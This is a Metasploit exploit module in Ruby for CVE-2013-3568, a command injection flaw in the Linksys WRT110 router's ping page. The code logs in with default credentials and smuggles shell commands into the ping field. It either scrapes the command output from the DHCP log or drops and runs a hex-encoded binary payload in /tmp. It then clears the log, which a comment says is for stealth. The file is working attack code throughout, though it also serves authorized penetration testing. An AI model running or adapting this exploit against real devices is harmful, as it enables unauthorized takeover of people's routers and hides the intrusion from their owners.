##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'nokogiri'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE

  # path to the dhcpc log, which we can scrape from the web interface
  DHCPC_LOG = '/var/log/dhcpc.log'

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Linksys WRT110 Remote Command Execution',
      'Description' => %q{
        The Linksys WRT110 consumer router is vulnerable to a command injection
        exploit in the ping field of the web interface. By piping output to a diagnostic
        log, we can scrape the command results from the web interface.

        Note: Using the CMD target will clear the DHCPC log in the web interface.
      },
      'Author'      =>
        [
          'Craig Young', # Vulnerability discovery
          'joev <jvennix[at]rapid7.com>' # msf module
        ],
      'License'     => MSF_LICENSE,
      'References'  => [['CVE', '2013-3568']],
      'DisclosureDate' => 'Jul 12 2013',
      'Privileged'     => true,
      'Platform'       => ['linux', 'unix'],
      'Targets'        =>
        [
          ['Linux mipsel Payload', {
            'Arch' => ARCH_MIPSLE,
            'Platform' => 'linux'
          }],
          ['CMD', {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
          }]
        ],
      'DefaultTarget'  => 0,
      ))

    register_options([
      OptString.new('USERNAME', [ true, 'Valid router administrator username', 'admin']),
      OptString.new('PASSWORD', [ false, 'Password to login with', 'admin']),
      OptAddress.new('RHOST', [true, 'The address of the router', '192.168.1.1']),
      OptInt.new('TIMEOUT', [false, 'The timeout to use in every request', 20])
    ], self.class)

    register_advanced_options([
      OptString.new('TMPPATH', [true, 'For native target, path to dropped exe', '/tmp/<random>']),
    ], self.class)
  end

  def check
    begin
      test_login!
    rescue Failure::NoAccess => e
      print_error "Authentication failure for #{user}:#{pass}"
      return Exploit::CheckCode::Safe
    end

    Exploit::CheckCode::Vulnerable
  end

  def exploit
    test_login!

    if cmd_target?
      # Stuffs the command into the ping target field and pipes output to a writeable log
      print_status("Injecting command: #{payload.encoded}")
      inject_cmd("#{payload.encoded} > #{DHCPC_LOG}")
      print_diagnostic_log
      clear_diagnostic_log
    else
      print_status('Injecting command to drop and execute binary payload')
      inject_cmd(build_echo_cmd)
    end
  end

  # Sends an HTTP request with authorization header to the router
  # Raises an exception unless the login is successful
  def test_login!
    print_status("#{rhost}:#{rport} - Trying to login with #{user}:#{pass}")

    res = send_request_cgi({
      'uri' => '/',
      'method' => 'GET'
    })

    if not res or res.code == 401 or res.code == 404
      fail_with(Failure::NoAccess, "#{rhost}:#{rport} - Could not login with #{user}:#{pass}")
    else
      print_good("#{rhost}:#{rport} - Successful login #{user}:#{pass}")
    end    
  end

  # Run the command on the router
  def inject_cmd(cmd)
    send_request_cgi({
      'uri' => '/ping.cgi',
      'method' => 'POST',
      'vars_post' => {
        'pingstr' => '& ' + cmd
      }
    })

    Rex.sleep(1) # Give the device a second
  end

  # Scrape log output from the web interface to get command results
  def print_diagnostic_log
    print_status("Scraping diagnostic log from web interface")
    r = send_request_cgi({
      'uri' => '/DHCPlog.htm',
      'method' => 'GET'
    })
    doc = Nokogiri::HTML(r.body)
    print_status("Command output:")
    print doc.css('table#AutoNumber3 tr td font').text.strip + "\n"
  end

  # Clear logs for stealth
  def clear_diagnostic_log
    print_status("Clearing diagnostic log")
    send_request_cgi({
      'uri' => '/delete_log.cgi',
      'method' => 'POST',
      'vars_post' => {
        'file' => 'dhcpc.log', # lol.
        'next_page' => 'DHCPlog.htm'
      }
    })
  end

  # Returns a string containing a shell command to execute
  def build_echo_cmd
    f = generate_payload_exe
    # encode the binary payload into a \x55\xAA hex format that busybox's echo understands
    hex_payload = (0...f.length).map { |i| '\\\\' + 'x'+ f[i].unpack('H*')[0] }.join
    "/bin/echo -e \"#{hex_payload}\" > #{tmp_path}; chmod +x #{tmp_path}; #{tmp_path}"
  end

  # Helper methods
  def user; datastore['USERNAME']; end
  def pass; datastore['PASSWORD'] || ''; end
  def cmd_target?; target.name =~ /cmd/i; end

  def tmp_path
    @tmp_path ||= datastore['TMPPATH'].gsub('<random>', Rex::Text.rand_text_alpha(10))
  end

  def send_request_cgi(opts={}, timeout=nil)
    timeout ||= datastore['TIMEOUT']
    opts.merge!('authorization' => basic_auth(user, pass))
    begin
      super
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unknown, "#{rhost}:#{rport} - Could not connect to the webservice")
    end
  end

end
